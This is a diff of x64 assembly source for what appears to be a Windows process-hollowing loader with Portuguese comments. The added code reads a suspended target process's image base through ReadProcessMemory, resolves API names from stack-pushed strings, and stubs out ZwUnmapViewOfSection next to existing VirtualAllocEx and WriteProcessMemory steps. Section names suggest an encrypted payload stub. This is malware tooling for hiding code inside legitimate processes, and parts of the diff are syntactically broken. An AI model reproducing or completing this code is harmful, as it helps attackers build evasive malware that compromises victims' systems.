@@ -162,6 +162,8 @@ section .data
     allocex times 8                                  dd 0 
     AddressEntryPoint times 8                        dd 0
     alloc times 8                                    dd 0
+    lpImageBase times 8                              dd 0
+    lpPreferableBase 8                               dd 0
 	
 section .codered
 	CodeRed:
@@ -265,7 +267,7 @@ section .deccode
 	add rax, 0x50
 	mov ebx, [eax]
 	mov [GetSizeTarget],ebx
-	mov [lpPebImageBase], rcx
+	mov [lpImageBase], rcx
 	
 	
 	call Locate_kernel32
@@ -289,6 +291,42 @@ section .deccode
 	call r12
 	
 	
+	;ReadProcessMemory
+	
+	mov rax, "y"
+	push Rax
+	mov rax, "essMemor"
+	push Rax, 
+	mov rax, "ReadProc"
+	push rax
+	lea rdx, [rsp]
+	mov rcx, rbx
+	sub rsp, 0x30
+	call R14
+	mov r12, rax
+	
+	;call ReadProcessMemory
+	mov rax, [ctx+CONTEXT.Rdx]
+	mov edx, 0x10
+	add rax,rdx
+	mov rdx, Rax
+ 
+	lea rcx, [lpPebImageBase]
+	xor rdi,rdi
+	mov [rsp+0x20], rdi
+	mov r9d, 0x08
+	mov r8, Rcx
+	mov rcx,[ProcInfo+PROCESSINFO.hProcess]
+	call r12
+	
+	
+	
+	;ZwUnmapViewOfSection
+	
+	
+	
+	
+	
 	
 	call Locate_kernel32
 	call LoadLibrary
@@ -307,7 +345,6 @@ section .deccode
 		add rsp, 0x10
 
 
-	
 	call Locate_kernel32
 	VirtualAllocEx:
 		;Lookup VirtualAllocEx
@@ -361,7 +398,6 @@ section .deccode
 	
 	;delta
 
-	;ZwUnmapViewOfSection
 
 	WriteProcess:
 		;Lookup WriteProcessMemory
@@ -443,11 +479,7 @@ WinMain:
 	call OpenFile
 	mov rbp,rdi
 	mov r10, rbp ; Arquivo alvo
-	;Nome do proprio programa
-	mov rax, "T0.exe"
-	add rsp, 0x20
-	mov [rsp+0x10], rax
-	xor rax, rax
+	
 	mov rax, [TamArqProgram]
 	mov [TamArqTarget], rax
 	xor r10,r10
